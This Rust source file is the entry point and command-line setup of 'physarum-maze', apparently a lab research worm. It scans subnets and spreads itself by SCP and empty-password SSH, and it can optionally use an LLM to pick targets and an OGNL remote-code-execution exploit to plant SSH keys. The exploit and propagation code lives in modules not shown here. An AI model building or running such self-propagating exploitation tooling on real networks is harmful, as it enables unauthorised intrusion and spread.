use clap::{ArgAction, Parser, ValueEnum};
use std::fmt;
use std::sync::Arc;
use tracing_subscriber::EnvFilter;

mod agent;
mod build_info;
mod discovery;
#[cfg(target_os = "linux")]
mod ebpf;
mod exploit_db;
mod graph_sink;
mod icmp;
mod lineage;
mod lineage_crypto;
mod llm_loop;
mod propagation;
mod server;
mod tcp;
mod tls_store;
mod vuln_intel;

#[derive(Clone, Debug, ValueEnum)]
pub enum Mode {
    /// Entry point — starts on Host A, bootstraps lineage
    Seed,
    /// Propagated instance — receives lineage from parent via --lineage-b64
    Propagated,
    /// Smoke-test: generate an ephemeral ed25519 keypair, print the pubkey and
    /// fingerprint, verify file permissions, then clean up. Exit 0 on success.
    KeygenTest,
}

#[derive(Clone, Copy, Debug, Default, Eq, PartialEq, ValueEnum)]
pub enum PolicyProfile {
    /// Controlled lab policy; the only supported profile in v0.5.5.
    #[default]
    LabOnly,
}

impl fmt::Display for PolicyProfile {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::LabOnly => f.write_str("lab-only"),
        }
    }
}

#[derive(Parser, Debug)]
#[command(
    name = "physarum-maze",
    about = "PF-1/PF-2 self-propagating maze agent (physarum slime-mould model)",
    long_about = "Listens for ICMP echo requests and TCP SYN packets to port 22, \
                  runs periodic /24 TCP-connect discovery via physarum-scanner, confirms SSH on discovered hosts, \
                  and propagates itself via SCP + empty-password SSH.  Detects already-\
                  colonized hosts and records secondary conduits.  Maintains a lineage \
                  JSON with D_ij path scores."
)]
pub struct Cli {
    /// Print rich build identity and exit
    #[arg(short = 'V', long = "version", action = ArgAction::SetTrue)]
    pub version: bool,

    /// Active policy profile. v0.5.5 supports only "lab-only".
    #[arg(
        long,
        value_enum,
        default_value_t = PolicyProfile::LabOnly,
        env = "PHYSARUM_POLICY_PROFILE"
    )]
    pub policy_profile: PolicyProfile,

    /// Operating mode
    #[arg(long, default_value = "seed")]
    pub mode: Mode,

    /// Network interface to capture ICMP/TCP on.
    /// Use "auto" (default) to detect automatically from --llm-allowed-cidr:
    /// picks the interface whose IP is in the CIDR with the most specific prefix length.
    /// Fall back: first non-loopback IPv4 interface when CIDR is absent.
    #[arg(long, default_value = "auto", env = "PHYSARUM_IFACE")]
    pub interface: String,

    /// Propagated mode: base64-encoded lineage JSON from parent host
    #[arg(long, env = "PHYSARUM_LINEAGE_B64")]
    pub lineage_b64: Option<String>,

    /// Path to compiled eBPF bytecode (physarum-ebpf-observer-ebpf ELF).
    /// When provided, eBPF is used as a 5th stimulus source in addition to
    /// ICMP, TCP-SYN, periodic discovery, and the dormancy timer.
    /// Linux only — ignored on other platforms.
    #[arg(long, env = "PHYSARUM_BPF_BYTECODE")]
    pub bpf_bytecode: Option<std::path::PathBuf>,

    /// Maximum propagation depth — guards against infinite loops
    #[arg(long, default_value_t = 12, env = "PHYSARUM_MAX_HOPS")]
    pub max_hops: usize,

    /// Seconds without any stimulus before the agent goes dormant.
    /// Should be > discovery_interval_secs so startup sweeps keep the agent alive.
    #[arg(long, default_value_t = 360, env = "PHYSARUM_STIMULUS_TIMEOUT")]
    pub stimulus_timeout_secs: u64,

    /// Interval in seconds between startup /24 sweep runs (Issue #126).
    /// First tick fires immediately on startup — no external ping required.
    #[arg(long, default_value_t = 180, env = "PHYSARUM_DISCOVERY_INTERVAL")]
    pub discovery_interval_secs: u64,

    // ── LLM reasoning flags (all optional — disabled by default) ───────────
    /// OpenAI-compatible LLM endpoint (e.g. http://localhost:11434 for Ollama).
    /// When absent, LLM reasoning is disabled and the organism falls back to
    /// the standard dead-end scoring for targets without port 22.
    #[arg(long, env = "PHYSARUM_LLM_ENDPOINT")]
    pub llm_endpoint: Option<String>,

    /// LLM model name passed to the endpoint (e.g. "gpt-4o", "llama3").
    #[arg(long, default_value = "gpt-4o-mini", env = "PHYSARUM_LLM_MODEL")]
    pub llm_model: String,

    /// LLM API key — read from environment only, never from CLI positional args.
    /// Set via LLM_API_KEY in the environment; do not pass on the command line.
    #[arg(long, env = "LLM_API_KEY", hide = true)]
    pub llm_api_key: Option<String>,

    /// LLM request timeout in milliseconds.
    #[arg(long, default_value_t = 30_000, env = "PHYSARUM_LLM_TIMEOUT_MS")]
    pub llm_timeout_ms: u64,

    /// Log the full LLM prompt and raw response at DEBUG level.
    /// Lab-only — keep false (default) in production to avoid leaking target
    /// information into logs. Enable with PHYSARUM_LLM_LOG_PROMPTS=true.
    #[arg(long, default_value_t = false, env = "PHYSARUM_LLM_LOG_PROMPTS")]
    pub llm_log_prompts: bool,

    /// CIDR allowed for LLM-assisted propagation attempts.
    /// Use a broad range (e.g. 172.16.0.0/12 or 10.0.0.0/8) so that any
    /// Docker or AWS subnet in that range is accepted without reconfiguration.
    /// Must be set when --llm-endpoint is active; targets outside this CIDR
    /// are rejected by the policy gate regardless of LLM recommendation.
    #[arg(long, env = "PHYSARUM_LLM_ALLOWED_CIDR")]
    pub llm_allowed_cidr: Option<String>,

    /// Enable exploit-class propagation (CVE RCE → binary copy).
    /// Off by default. Requires --llm-endpoint. When enabled:
    ///   - PolicyGate allows PropagationMethod::Exploit
    ///   - OGNL FileOutputStream plants the ephemeral pubkey on the target
    ///     so the binary can be delivered exclusively via SCP.
    ///
    /// Lab-only. Do NOT enable outside an isolated test environment.
    #[arg(long, default_value_t = false, env = "PHYSARUM_EXPLOIT_ENABLED")]
    pub exploit_enabled: bool,

    /// Start the live organism graph server on the given port (default 8080).
    /// Serves the organism visualization frontend at / and the SSE event stream
    /// at /events. Seed mode only. Lab-use — no authentication on the API.
    #[arg(long, value_name = "PORT", default_missing_value = "8080", num_args = 0..=1, env = "PHYSARUM_SERVER_PORT")]
    pub server: Option<u16>,

    /// Enable HTTPS for the browser dashboard (Issue #190).
    /// Generates an ephemeral self-signed cert (SAN=localhost+127.0.0.1) and
    /// binds to 127.0.0.1 only. Default port changes to 8443 when --tls is set.
    /// Browser will show a self-signed cert warning on first visit — click
    /// "Advanced → Proceed". CA cert is written to /tmp/physarum/ca.pem.
    #[arg(long, default_value_t = false, env = "PHYSARUM_TLS")]
    pub tls: bool,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();

    if cli.version {
        println!("{}", build_info::rich_version());
        return Ok(());
    }

    tracing_subscriber::fmt()
        .with_env_filter(
            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
        )
        .init();

    // Initialise lineage crypto key before any lineage serialisation occurs.
    match &cli.mode {
        Mode::Seed => lineage_crypto::init_seed(),
        Mode::Propagated => lineage_crypto::init_from_env(),
        Mode::KeygenTest => {}
    }

    // Default port: 8443 when --tls, 8080 otherwise.
    let effective_port = cli.server.unwrap_or(if cli.tls { 8443 } else { 8080 });

    let sink = if cli.server.is_some() || cli.tls {
        let port = effective_port;
        let sink = Arc::new(graph_sink::GraphSink::new());

        // TLS store powers both the browser HTTPS server (Issue #190) and the
        // mTLS back-channel (Issue #189).  Create it once and share via Arc.
        match tls_store::TlsStore::new() {
            Ok(store) => {
                let store = Arc::new(store);
                tls_store::STORE.set(Arc::clone(&store)).ok();

                // Browser server — HTTPS when --tls, plain HTTP otherwise.
                let sink_browser = Arc::clone(&sink);
                let store_browser = if cli.tls {
                    Some(Arc::clone(&store))
                } else {
                    None
                };
                tokio::spawn(async move {
                    if let Err(e) = server::start(port, sink_browser, store_browser).await {
                        tracing::error!(err = %e, "organism server stopped");
                    }
                });

                // mTLS back-channel on port + 1 (Issue #189).
                let sink_mtls = Arc::clone(&sink);
                let mtls_port = port + 1;
                tokio::spawn(async move {
                    if let Err(e) =
                        server::start_mtls_backchannel(mtls_port, sink_mtls, store).await
                    {
                        tracing::error!(err = %e, "mTLS back-channel stopped");
                    }
                });
            }
            Err(e) => {
                tracing::warn!(err = %e, "TLS store init failed — starting plain HTTP only");
                // Fall back to plain HTTP browser server without mTLS back-channel.
                let sink_browser = Arc::clone(&sink);
                tokio::spawn(async move {
                    if let Err(e) = server::start(port, sink_browser, None).await {
                        tracing::error!(err = %e, "organism server stopped");
                    }
                });
            }
        }

        Some(sink)
    } else {
        None
    };

    agent::run(cli, sink).await
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn version_flags_parse_without_starting_the_agent() {
        assert!(
            Cli::try_parse_from(["physarum-maze", "--version"])
                .unwrap()
                .version
        );
        assert!(
            Cli::try_parse_from(["physarum-maze", "-V"])
                .unwrap()
                .version
        );
    }

    #[test]
    fn policy_profile_defaults_to_lab_only() {
        let cli = Cli::try_parse_from(["physarum-maze"]).unwrap();

        assert_eq!(cli.policy_profile, PolicyProfile::LabOnly);
    }

    #[test]
    fn policy_profile_accepts_lab_only_explicitly() {
        let cli = Cli::try_parse_from(["physarum-maze", "--policy-profile", "lab-only"]).unwrap();

        assert_eq!(cli.policy_profile, PolicyProfile::LabOnly);
    }

    #[test]
    fn policy_profile_rejects_unknown_values() {
        assert!(Cli::try_parse_from(["physarum-maze", "--policy-profile", "production"]).is_err());
    }
}
